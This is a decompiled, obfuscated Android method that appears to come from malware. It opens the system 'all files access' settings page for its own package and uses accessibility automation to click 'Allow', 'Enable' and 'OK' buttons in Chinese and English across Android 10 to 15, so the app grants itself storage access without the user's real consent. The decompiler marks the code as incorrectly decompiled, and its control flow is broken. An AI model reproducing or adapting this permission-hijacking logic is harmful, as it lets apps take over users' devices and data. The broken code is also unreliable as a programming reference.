    /* JADX WARN: Removed duplicated region for block: B:176:0x0348 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:177:0x0350 A[Catch: Exception -> 0x0052, PHI: r8 r9
      0x0350: PHI (r8v6 int) = (r8v7 int), (r8v8 int), (r8v8 int) binds: [B:175:0x0346, B:164:0x0312, B:170:0x032b] A[DONT_GENERATE, DONT_INLINE]
      0x0350: PHI (r9v8 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r9v67 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v68 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v69 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:175:0x0346, B:164:0x0312, B:170:0x032b] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:186:0x0394  */
    /* JADX WARN: Removed duplicated region for block: B:192:0x03b9  */
    /* JADX WARN: Removed duplicated region for block: B:196:0x03c8  */
    /* JADX WARN: Removed duplicated region for block: B:197:0x03d1  */
    /* JADX WARN: Removed duplicated region for block: B:207:? A[PHI: r1 r8 r9
      PHI (r1v4 com.storm.safe.rock.service.modules.yw5xud.a5) = (r1v3 com.storm.safe.rock.service.modules.yw5xud.a5), (r1v6 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:110:0x0223, B:101:0x01df] A[DONT_GENERATE, DONT_INLINE]
      PHI (r8v16 int) = (r8v15 int), (r8v17 int) binds: [B:110:0x0223, B:101:0x01df] A[DONT_GENERATE, DONT_INLINE]
      PHI (r9v18 java.util.Iterator) = (r9v17 java.util.Iterator), (r9v21 java.util.Iterator) binds: [B:110:0x0223, B:101:0x01df] A[DONT_GENERATE, DONT_INLINE], SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x00ef A[Catch: Exception -> 0x0052, TRY_ENTER, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x014c  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x014e A[Catch: Exception -> 0x0052, PHI: r8 r9
      0x014e: PHI (r8v19 int) = (r8v20 int), (r8v27 int) binds: [B:68:0x014a, B:45:0x00aa] A[DONT_GENERATE, DONT_INLINE]
      0x014e: PHI (r9v23 com.storm.safe.rock.service.modules.yw5xud.a5) = (r9v45 com.storm.safe.rock.service.modules.yw5xud.a5), (r9v46 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:68:0x014a, B:45:0x00aa] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0189  */
    /* JADX WARN: Removed duplicated region for block: B:89:0x0191 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:92:0x019f A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:96:0x01b9  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x01c1 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Type inference failed for: r9v19 */
    /* JADX WARN: Type inference failed for: r9v33 */
    /* JADX WARN: Type inference failed for: r9v41 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:110:0x0223 -> B:199:0x01e1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:189:0x03b3 -> B:191:0x03b6). Please report as a decompilation issue!!! */
    /* renamed from: c3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212325c3(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeFileAccess$1 oppoStepsSimplified$executeFileAccess$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        C0368a5 c0368a53;
        boolean z;
        C0368a5 c0368a54;
        long j;
        C0368a5 c0368a55;
        boolean z2;
        C0368a5 c0368a56;
        boolean z3;
        C0368a5 c0368a57;
        C0368a5 c0368a58;
        long j2;
        boolean zM212312a7;
        Iterator it;
        C0368a5 c0368a59;
        C0368a5 c0368a510;
        long j3;
        C0368a5 c0368a511;
        long j4;
        C0368a5 c0368a512;
        long j5;
        int i;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (!(continuationImpl instanceof OppoStepsSimplified$executeFileAccess$1) || (obj = (i = (oppoStepsSimplified$executeFileAccess$1 = (OppoStepsSimplified$executeFileAccess$1) continuationImpl).f54566a5) & Integer.MIN_VALUE) == 0) {
            oppoStepsSimplified$executeFileAccess$1 = new OppoStepsSimplified$executeFileAccess$1(this, continuationImpl);
        } else {
            oppoStepsSimplified$executeFileAccess$1.f54566a5 = i - Integer.MIN_VALUE;
        }
        Object obj = oppoStepsSimplified$executeFileAccess$1.f54564a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeFileAccess$1.f54566a5;
        int i3 = 3;
        try {
        } catch (Exception e) {
            e = e;
        }
        switch (i2) {
            case 0:
                kg1.m213544f4(obj);
                if (m212336d9("fileaccess")) {
                    m212303e0("⏭️ 文件访问已完成，跳过");
                    return c1351vv;
                }
                if (this.f55113a2 < 30) {
                    m212303e0("⏭️ Android 11以下不需要文件访问权限");
                    m212341e5("fileaccess");
                    return c1351vv;
                }
                if (Environment.isExternalStorageManager()) {
                    m212303e0("✅ 已有文件访问权限");
                    m212341e5("fileaccess");
                    return c1351vv;
                }
                m212303e0("[流程] Intent打开文件访问设置");
                i2 = 0;
                c0368a5 = this;
                if (i2 < i3) {
                    Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                    intent.setData(Uri.parse("package:" + c0368a5.f55112a1.getPackageName()));
                    intent.setFlags(276856832);
                    c0368a5.f55112a1.startActivity(intent);
                    m212303e0("[文件访问] 等待页面加载...");
                    long j6 = c0368a5.f55123b2;
                    oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a5;
                    oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                    oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                    oppoStepsSimplified$executeFileAccess$1.f54566a5 = 1;
                    c0368a512 = c0368a5;
                    if (b81.m210571b1(j6, oppoStepsSimplified$executeFileAccess$1) != coroutineSingletons) {
                        c0368a512.m212317b5("文件访问设置页");
                        j5 = c0368a512.f55125b4;
                        oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a512;
                        oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                        oppoStepsSimplified$executeFileAccess$1.f54566a5 = 2;
                        c0368a511 = c0368a512;
                        if (b81.m210571b1(j5, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                            if (!c0368a511.m212308a3("开启") && !c0368a511.m212312a7("开启") && !c0368a511.m212308a3("Enable") && !c0368a511.m212312a7("Enable") && !c0368a511.m212308a3("Turn on") && !c0368a511.m212312a7("Turn on")) {
                                c0368a510 = c0368a511;
                                if (!c0368a510.m212308a3("允许")) {
                                    boolean zM212312a72 = c0368a510.m212312a7("允许");
                                    c0368a59 = c0368a510;
                                    break;
                                }
                                m212303e0("✅ 点击[允许]按钮成功");
                                j3 = c0368a510.f55124b3;
                                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a510;
                                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 4;
                                c0368a5 = c0368a510;
                                if (b81.m210571b1(j3, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                }
                                c0368a59 = c0368a5;
                                if (Environment.isExternalStorageManager()) {
                                    c0368a5.getClass();
                                    m212303e0("✅ 文件访问权限开启成功");
                                }
                                c0368a57 = c0368a59;
                                it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                                while (it.hasNext()) {
                                    String str = (String) it.next();
                                    if (c0368a57.m212319b7(str)) {
                                        m212303e0("✅ 开关[" + str + "]处理完成");
                                        long j7 = c0368a57.f55124b3;
                                        oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a57;
                                        oppoStepsSimplified$executeFileAccess$1.f54562a1 = it;
                                        oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                        oppoStepsSimplified$executeFileAccess$1.f54566a5 = 5;
                                        if (b81.m210571b1(j7, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                        }
                                        if (Environment.isExternalStorageManager()) {
                                            while (it.hasNext()) {
                                            }
                                        } else {
                                            c0368a57.getClass();
                                            m212303e0("✅ 文件访问权限开启成功");
                                        }
                                        c0368a58 = c0368a57;
                                        if (!c0368a58.f55115a4) {
                                            boolean z4 = c0368a58.f55116a5;
                                            c0368a56 = c0368a58;
                                            break;
                                        }
                                        m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                                        if (!c0368a58.m212308a3("确定") && !c0368a58.m212308a3("OK") && !c0368a58.m212308a3("允许") && !c0368a58.m212308a3("Allow") && !c0368a58.m212312a7("我知道了")) {
                                            zM212312a7 = c0368a58.m212312a7("Got it");
                                            c0368a56 = c0368a58;
                                            if (zM212312a7) {
                                                z3 = c0368a56.f55117a6;
                                                c0368a55 = c0368a56;
                                                if (z3) {
                                                    m212303e0("[9.x] Android 12: 尝试点击[确定/应用/允许]...");
                                                    if (!c0368a56.m212308a3("确定") && !c0368a56.m212308a3("应用")) {
                                                        boolean zM212312a73 = c0368a56.m212312a7("允许");
                                                        c0368a55 = c0368a56;
                                                        if (zM212312a73) {
                                                        }
                                                    }
                                                    long j8 = c0368a56.f55124b3;
                                                    oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a56;
                                                    oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                                    oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                    oppoStepsSimplified$executeFileAccess$1.f54566a5 = 7;
                                                    c0368a5 = c0368a56;
                                                    if (b81.m210571b1(j8, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                                    }
                                                    c0368a55 = c0368a5;
                                                    if (Environment.isExternalStorageManager()) {
                                                        c0368a5.getClass();
                                                        m212303e0("✅ 文件访问权限开启成功");
                                                    }
                                                }
                                                z2 = c0368a55.f55118a7;
                                                c0368a53 = c0368a55;
                                                if (z2) {
                                                    m212303e0("[9.x] Android 13: 再次尝试点击...");
                                                    c0368a55.m212308a3("确定");
                                                    long j9 = c0368a55.f55125b4;
                                                    oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a55;
                                                    oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                                    oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                    oppoStepsSimplified$executeFileAccess$1.f54566a5 = 8;
                                                    c0368a54 = c0368a55;
                                                    if (b81.m210571b1(j9, oppoStepsSimplified$executeFileAccess$1) != coroutineSingletons) {
                                                        c0368a54.m212308a3("允许");
                                                        j = c0368a54.f55124b3;
                                                        oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a54;
                                                        oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                        oppoStepsSimplified$executeFileAccess$1.f54566a5 = 9;
                                                        c0368a5 = c0368a54;
                                                        if (b81.m210571b1(j, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                                        }
                                                        c0368a53 = c0368a5;
                                                        if (Environment.isExternalStorageManager()) {
                                                            c0368a5.getClass();
                                                            m212303e0("✅ 文件访问权限开启成功");
                                                        }
                                                        z = c0368a53.f55119a8;
                                                        c0368a5 = c0368a53;
                                                        if (!z) {
                                                            m212303e0("[9.x] Android 14/15: 尝试点击[允许/授予权限/确定]...");
                                                            if (!c0368a53.m212308a3("允许") && !c0368a53.m212312a7("授予权限")) {
                                                                boolean zM212308a3 = c0368a53.m212308a3("确定");
                                                                c0368a5 = c0368a53;
                                                                if (!zM212308a3) {
                                                                    if (Environment.isExternalStorageManager()) {
                                                                        c0368a5.getClass();
                                                                        m212303e0("✅ 文件访问权限开启成功");
                                                                    } else {
                                                                        c0368a5.f55111a0.performGlobalAction(1);
                                                                        long j10 = c0368a5.f55125b4;
                                                                        oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a5;
                                                                        oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                                                        oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                                        oppoStepsSimplified$executeFileAccess$1.f54566a5 = 11;
                                                                        c0368a52 = c0368a5;
                                                                        if (b81.m210571b1(j10, oppoStepsSimplified$executeFileAccess$1) != coroutineSingletons) {
                                                                            if (i2 >= 2 && !Environment.isExternalStorageManager()) {
                                                                                c0368a52.getClass();
                                                                                m212303e0("⚠️ 页面未打开，重试...");
                                                                                long j11 = c0368a52.f55124b3;
                                                                                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a52;
                                                                                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                                                                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                                                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 12;
                                                                                break;
                                                                            }
                                                                            i2++;
                                                                            i3 = 3;
                                                                            c0368a5 = c0368a52;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                            long j12 = c0368a53.f55124b3;
                                                            oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a53;
                                                            oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                                            oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                                            oppoStepsSimplified$executeFileAccess$1.f54566a5 = 10;
                                                            c0368a5 = c0368a53;
                                                            if (b81.m210571b1(j12, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                                            }
                                                            c0368a5 = c0368a5;
                                                            if (!Environment.isExternalStorageManager()) {
                                                                c0368a5.getClass();
                                                                m212303e0("✅ 文件访问权限开启成功");
                                                            }
                                                        }
                                                        if (i2 < i3) {
                                                        }
                                                    }
                                                } else {
                                                    z = c0368a53.f55119a8;
                                                    c0368a5 = c0368a53;
                                                    if (!z) {
                                                    }
                                                    if (i2 < i3) {
                                                    }
                                                }
                                            }
                                        }
                                        j2 = c0368a58.f55124b3;
                                        oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                                        oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                        oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                        oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                                        c0368a5 = c0368a58;
                                        if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                        }
                                        c0368a56 = c0368a5;
                                        if (Environment.isExternalStorageManager()) {
                                            c0368a5.getClass();
                                            m212303e0("✅ 文件访问权限开启成功");
                                        }
                                        z3 = c0368a56.f55117a6;
                                        c0368a55 = c0368a56;
                                        if (z3) {
                                        }
                                        z2 = c0368a55.f55118a7;
                                        c0368a53 = c0368a55;
                                        if (z2) {
                                        }
                                    }
                                }
                                c0368a58 = c0368a57;
                                if (!c0368a58.f55115a4) {
                                }
                                m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                                if (!c0368a58.m212308a3("确定")) {
                                    zM212312a7 = c0368a58.m212312a7("Got it");
                                    c0368a56 = c0368a58;
                                    if (zM212312a7) {
                                    }
                                }
                                j2 = c0368a58.f55124b3;
                                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                                oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                                c0368a5 = c0368a58;
                                if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                                }
                                c0368a56 = c0368a5;
                                if (Environment.isExternalStorageManager()) {
                                }
                                z3 = c0368a56.f55117a6;
                                c0368a55 = c0368a56;
                                if (z3) {
                                }
                                z2 = c0368a55.f55118a7;
                                c0368a53 = c0368a55;
                                if (z2) {
                                }
                            }
                            m212303e0("✅ 点击[开启]按钮成功");
                            j4 = c0368a511.f55124b3;
                            oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a511;
                            oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                            oppoStepsSimplified$executeFileAccess$1.f54566a5 = 3;
                            c0368a5 = c0368a511;
                            if (b81.m210571b1(j4, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                            }
                            c0368a510 = c0368a5;
                            if (Environment.isExternalStorageManager()) {
                                c0368a5.getClass();
                                m212303e0("✅ 文件访问权限开启成功");
                            }
                            if (!c0368a510.m212308a3("允许")) {
                            }
                            m212303e0("✅ 点击[允许]按钮成功");
                            j3 = c0368a510.f55124b3;
                            oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a510;
                            oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                            oppoStepsSimplified$executeFileAccess$1.f54566a5 = 4;
                            c0368a5 = c0368a510;
                            if (b81.m210571b1(j3, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                            }
                            c0368a59 = c0368a5;
                            if (Environment.isExternalStorageManager()) {
                            }
                            c0368a57 = c0368a59;
                            it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                            while (it.hasNext()) {
                            }
                            c0368a58 = c0368a57;
                            if (!c0368a58.f55115a4) {
                            }
                            m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                            if (!c0368a58.m212308a3("确定")) {
                            }
                            j2 = c0368a58.f55124b3;
                            oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                            oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                            oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                            oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                            c0368a5 = c0368a58;
                            if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                            }
                            c0368a56 = c0368a5;
                            if (Environment.isExternalStorageManager()) {
                            }
                            z3 = c0368a56.f55117a6;
                            c0368a55 = c0368a56;
                            if (z3) {
                            }
                            z2 = c0368a55.f55118a7;
                            c0368a53 = c0368a55;
                            if (z2) {
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                if (Environment.isExternalStorageManager()) {
                    c0368a5.getClass();
                    m212303e0("⚠️ 文件访问权限未开启，下次重新进入时会继续");
                } else {
                    c0368a5.m212341e5("fileaccess");
                    m212303e0("✅ 文件访问流程完成");
                }
                return c1351vv;
            case 1:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a513 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a512 = c0368a513;
                c0368a512.m212317b5("文件访问设置页");
                j5 = c0368a512.f55125b4;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a512;
                oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                oppoStepsSimplified$executeFileAccess$1.f54566a5 = 2;
                c0368a511 = c0368a512;
                if (b81.m210571b1(j5, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                i2 = oppoStepsSimplified$executeFileAccess$1.f54563a2;
                C0368a5 c0368a514 = oppoStepsSimplified$executeFileAccess$1.f54561a0;
                kg1.m213544f4(obj);
                c0368a511 = c0368a514;
                if (!c0368a511.m212308a3("开启")) {
                    c0368a510 = c0368a511;
                    if (!c0368a510.m212308a3("允许")) {
                    }
                    m212303e0("✅ 点击[允许]按钮成功");
                    j3 = c0368a510.f55124b3;
                    oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a510;
                    oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                    oppoStepsSimplified$executeFileAccess$1.f54566a5 = 4;
                    c0368a5 = c0368a510;
                    if (b81.m210571b1(j3, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                    }
                    c0368a59 = c0368a5;
                    if (Environment.isExternalStorageManager()) {
                    }
                    c0368a57 = c0368a59;
                    it = AbstractC0716jf.m213306g5("授予所有文件的管理权限", "所有文件访问权限", "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件").iterator();
                    while (it.hasNext()) {
                    }
                    c0368a58 = c0368a57;
                    if (!c0368a58.f55115a4) {
                    }
                    m212303e0("[9.x] Android 10/11: 尝试点击[确定/允许]...");
                    if (!c0368a58.m212308a3("确定")) {
                    }
                    j2 = c0368a58.f55124b3;
                    oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a58;
                    oppoStepsSimplified$executeFileAccess$1.f54562a1 = null;
                    oppoStepsSimplified$executeFileAccess$1.f54563a2 = i2;
                    oppoStepsSimplified$executeFileAccess$1.f54566a5 = 6;
                    c0368a5 = c0368a58;
                    if (b81.m210571b1(j2, oppoStepsSimplified$executeFileAccess$1) == coroutineSingletons) {
                    }
                    c0368a56 = c0368a5;
                    if (Environment.isExternalStorageManager()) {
                    }
                    z3 = c0368a56.f55117a6;
                    c0368a55 = c0368a56;
                    if (z3) {
                    }
                    z2 = c0368a55.f55118a7;
                    c0368a53 = c0368a55;
                    if (z2) {
                    }
                    return coroutineSingletons;
                }
                m212303e0("✅ 点击[开启]按钮成功");
                j4 = c0368a511.f55124b3;
                oppoStepsSimplified$executeFileAccess$1.f54561a0 = c0368a511;
